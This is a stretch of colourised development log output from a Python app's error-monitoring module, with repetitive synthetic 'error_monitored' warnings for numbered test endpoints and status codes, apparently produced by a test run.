WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3018'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3019'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849805Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3020'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849858Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3021'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3022'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.849964Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3023'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3024'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3025'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3026'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3027'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850252Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3028'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850342Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3029'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850448Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3030'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850517Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3031'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3032'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850624Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3033'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850676Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3034'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3035'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3036'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850822Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3037'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850871Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3038'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850918Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3039'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.850966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3040'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3041'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3042'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3043'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851169Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3044'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3045'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3046'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851387Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3047'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3048'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851495Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m61[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3049'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851546Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3050'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3051'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851648Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3052'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3053'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3054'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3055'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3056'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.851892Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m62[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3057'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
